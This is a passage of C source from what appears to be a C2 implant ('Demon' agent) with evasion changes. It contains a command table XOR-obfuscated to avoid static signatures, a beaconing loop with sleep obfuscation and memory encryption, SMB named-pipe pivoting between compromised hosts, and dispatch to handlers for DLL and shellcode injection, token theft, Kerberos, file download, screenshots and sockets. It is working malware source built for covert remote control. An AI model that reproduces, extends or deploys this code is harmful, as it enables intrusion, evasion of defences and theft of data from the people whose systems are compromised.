...
#define COMMAND_XOR_KEY 0xAF82B8C7A1DA2E1E  // Example key, should be random and unique per build

// Runtime command table - no static function pointers
static ENCRYPTED_COMMAND_ENTRY EncryptedCommands[24];  // Space for all commands + terminator
static BOOL CommandTableInitialized = FALSE;

// Build encrypted command table at runtime to avoid static signatures
VOID InitializeCommandTable() {
    if (CommandTableInitialized) return;
    
    UINT32 index = 0;
    
    // Build the table dynamically at runtime with full pointer size
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_SLEEP, ((UINT_PTR)CommandSleep) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_CHECKIN, ((UINT_PTR)CommandCheckin) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_JOB, ((UINT_PTR)CommandJob) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_PROC, ((UINT_PTR)CommandProc) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_PROC_LIST, ((UINT_PTR)CommandProcList) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_FS, ((UINT_PTR)CommandFS) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_INLINE_EXECUTE, ((UINT_PTR)CommandInlineExecute) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, ((UINT_PTR)CommandAssemblyInlineExecute) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_ASSEMBLY_VERSIONS, ((UINT_PTR)CommandAssemblyListVersion) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_CONFIG, ((UINT_PTR)CommandConfig) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_SCREENSHOT, ((UINT_PTR)CommandScreenshot) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_PIVOT, ((UINT_PTR)CommandPivot) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_NET, ((UINT_PTR)CommandNet) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_INJECT_DLL, ((UINT_PTR)CommandInjectDLL) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_INJECT_SHELLCODE, ((UINT_PTR)CommandInjectShellcode) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_SPAWN_DLL, ((UINT_PTR)CommandSpawnDLL) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_TOKEN, ((UINT_PTR)CommandToken) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_TRANSFER, ((UINT_PTR)CommandTransfer) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_SOCKET, ((UINT_PTR)CommandSocket) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_KERBEROS, ((UINT_PTR)CommandKerberos) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_COMMAND_MEM_FILE, ((UINT_PTR)CommandMemFile) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index++] = (ENCRYPTED_COMMAND_ENTRY){ DEMON_EXIT, ((UINT_PTR)CommandExit) ^ COMMAND_XOR_KEY };
    EncryptedCommands[index] = (ENCRYPTED_COMMAND_ENTRY){ 0, 0 };  // Terminator
    
    CommandTableInitialized = TRUE;
}

// Decrypt and resolve command function pointer at runtime
PVOID ResolveCommandFunction(UINT32 CommandID) {
    InitializeCommandTable();
    
    for (UINT32 i = 0; EncryptedCommands[i].CommandID != 0; i++) {
        if (EncryptedCommands[i].CommandID == CommandID) {
            // Decrypt the function pointer with full pointer size
            UINT_PTR DecryptedAddr = EncryptedCommands[i].EncryptedFunction ^ COMMAND_XOR_KEY;
            return (PVOID)DecryptedAddr;
        }
    }
    return NULL;
}
...
VOID CommandDispatcher( VOID )
{
    ...
    UINT32   CommandID      = { 0 };
    UINT32   RequestID      = { 0 };
    static UINT32 CommandCount = 0;  // Track commands for periodic cleanup
    
    // Initialize global agent protection system
    PVOID VehHandle = InitializeAgentProtection();

    PRINTF( "Session ID => %x (Protected Mode)\n", Instance->Session.AgentID );

#ifdef DEBUG
    PRINTF( "[DEBUG::CommandDispatcher] Active magic value: 0x%08x\n", DEMON_MAGIC_VALUE );
#endif
    ...
    do {
        ...
        /*
         * HTTP AGENT LOOP:
         * 1. Sleep (with memory encryption)
         * 2. Collect children's data FIRST (PivotPush before send)
         * 3. Send everything to server in one beacon (own + children's data)
         * 4. Execute received commands
         * 5. Post-execution push (jobs, downloads, etc.)
         */
        SleepObf();

        PUTS_DONT_SEND( "[LOOP] SleepObf returned" )
        ...
        /* Collect children's pending data BEFORE talking to the server.
         * This way, children's responses go up in the SAME beacon cycle
         * instead of waiting for the next one — cuts 1 cycle of latency per hop. */
        PivotPush();

        PUTS_DONT_SEND( "[LOOP] PivotPush done, sending beacon" )

        /* Send our buffer (own data + children's data collected above). */
...
#else
        /*
         * SMB AGENT LOOP (event-driven, not polling):
         *
         * 1. Block on parent pipe (SmbRecv with long timeout + overlapped I/O)
         *    → wakes INSTANTLY when parent writes (pipe event signals in ROP chain)
         *    → times out only for periodic PivotPush relay (leaf: 5min, relay: 60s)
         * 2. Execute received commands (may PipeWrite to children → wakes them)
         * 3. Wait 500ms for children to process and respond
         * 4. Collect children's data (PivotPush)
         * 5. Send everything UP to parent (own response + children's data)
         *
         * Memory encrypted during the entire idle period inside SmbRecv.
         * No SleepObf between send/recv — encryption is inside the pipe wait.
         *
         * Command propagation chain: parent PipeWrite → child1 wakes instantly
         * → child1 PipeWrite → child2 wakes instantly → response flows back.
         * Latency is dominated by ROP chain completion (~50ms per hop), not
         * sleep intervals.
         */
        ...
        /* Read from pipe — times out after sleep interval so we can service children */
        if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
        {
            PUTS( "SMBGetJob failed" )
            /* Sleep briefly before retrying to avoid tight failure loop */
            SleepObf();
            continue;
        }
        ...
        /* === COMMON: Parse and execute commands === */
        if ( DataBuffer && DataBufferSize > 0 ) {
            ...
            do {
                ...
                if ( CommandID != DEMON_COMMAND_NO_JOB ) {
                    ...
                    PVOID CommandFunction = NULL;
                    
                    CommandFunction = ResolveCommandFunction(CommandID);
                    
                    if (CommandFunction) {
                        CommandFound = TRUE;
                        
#ifdef DEBUG
                        PRINTF( "[DEBUG::COMMAND] Received CommandID: 0x%08x → Function: %p (RequestID: %d)\n", 
                                CommandID, CommandFunction, RequestID );
#endif
                        
                        CommandCount++;
                        if ( CommandCount % 20 == 0 ) {
                            PRINTF( "Resetting VEH state after %d commands\n", CommandCount );
                            ResetAgentProtection();
                        }
                        
                        BOOL Success = ExecuteProtectedCommand( CommandID, RequestID, 
                                                               CommandFunction, 
                                                               &TaskParser );
                        
                        if ( !Success ) {
                            PRINTF( "Command %x failed or timed out but agent protected\n", CommandID );
                        }
                    }
                    
                    if ( !CommandFound ) {
#ifdef DEBUG
                        PRINTF( "[DEBUG::COMMAND] UNKNOWN CommandID: 0x%08x (RequestID: %d) - Not found in DemonCommands table\n", CommandID, RequestID );
#endif
                        SendUnknownCommandError( CommandID );
                    }
                }
        ...
        {
#ifdef TRANSPORT_HTTP
            /* Empty response — either transport failure or server returned no tasks.
             * Either way, just retry next cycle. Never exit the command loop here.
             * The agent has valid session keys and should keep beaconing forever.
             * Kill date and host exhaustion handle the "give up" scenarios. */
            continue;
#endif
        }

        /* === COMMON: Post-execution data collection === */
        JobCheckList();

#ifdef TRANSPORT_SMB
        /* For SMB agents with children: after executing commands (which may have
         * written to children via DEMON_PIVOT_SMB_COMMAND), give children time
         * to wake from encrypted sleep, process, and write responses back.
         *
         * Children use event-driven wake (pipe I/O event inside ROP chain),
         * so they start waking the instant PipeWrite completes.  Budget:
         *   ~50ms  ROP chain completion (timer fire → decrypt → VP restore)
         *   ~10ms  SmbRecv I/O completion path
         *   ~50ms  Command processing (simple commands)
         *   ~10ms  PackageTransmitAll pipe write
         *   ~380ms margin for complex commands / multi-child fan-out
         *
         * 500ms total ensures PivotPush collects responses in the SAME cycle
         * for most commands.  Long-running commands (BOF, download) will be
         * picked up on the next relay cycle. */
        if ( Instance->SmbPivots )
            Instance->Win32.Sleep( 500 );
#endif

        /* Collect children's data (for HTTP this is a second pass after commands;
         * for SMB this is the primary collection before sending up) */
        PivotPush();
...
#ifdef TRANSPORT_SMB
        /* Send all collected data UP to parent (own response + children's data).
         * This happens AFTER PivotPush so children's data goes up immediately.
         *
         * No SleepObf here — memory encryption now happens INSIDE SmbRecv's
         * idle loop at the top of the next iteration. The agent re-encrypts
         * immediately upon entering the pipe wait, staying protected for the
         * entire idle period instead of just a brief window after transmit. */
        PackageTransmitAll( NULL, NULL );
#endif

    } while ( TRUE );

    /* Do NOT cleanup the VEH trampoline here.  After CommandDispatcher returns
     * (connection dropped), DemonMain still calls SleepObf() for the retry
     * sleep.  The ROP chain needs the VEH recovery to survive thread pool
     * stack corruption.  The trampoline costs nothing when idle (SleepingFlag=0
     * → all exceptions pass through to SEH).  It persists for the entire
     * process lifetime. */

    Instance->Session.Connected = FALSE;

    PUTS( "Out of command loop — VEH trampoline retained for retry sleep" )
}
...
VOID CommandFS( PPARSER Parser )
{
    ...
    switch ( Command )
    {
        ...
        case DEMON_COMMAND_FS_DOWNLOAD: PUTS( "FS::Download" )
        {
            ...
            // Check if aggressive flag is present (more data available)
            if ( Parser->Length > 0 ) {
                Aggressive = ParserGetBool( Parser );
                PRINTF( "Aggressive download mode: %s\n", Aggressive ? "TRUE" : "FALSE" );
            }
            ...
            /* Start our download. */
            Download = DownloadAdd( hFile, FileSize.QuadPart, Aggressive );
...
VOID CommandPivot( PPARSER Parser )
{
    ...
    switch ( Pivot )
    {
        ...
        case DEMON_PIVOT_SMB_COMMAND:
        {
            ...
            /* DEMON_PIVOT_SMB_COMMAND is fire-and-forget: no response back to teamserver.
             * Destroy the unused Package to prevent memory leak (was allocated by CommandPivot). */
            PackageDestroy( Package );
            return;
        }
...
VOID CommandMemFile( PPARSER Parser )
{
    ...
    // Clean up any leftover MemFiles to prevent resource conflicts
    static BOOL FirstCall = TRUE;
    if ( FirstCall )
    {
        PUTS( "First MemFile operation - cleaning up any leftover MemFiles" );
        CleanupAllMemFiles();
        FirstCall = FALSE;
    }
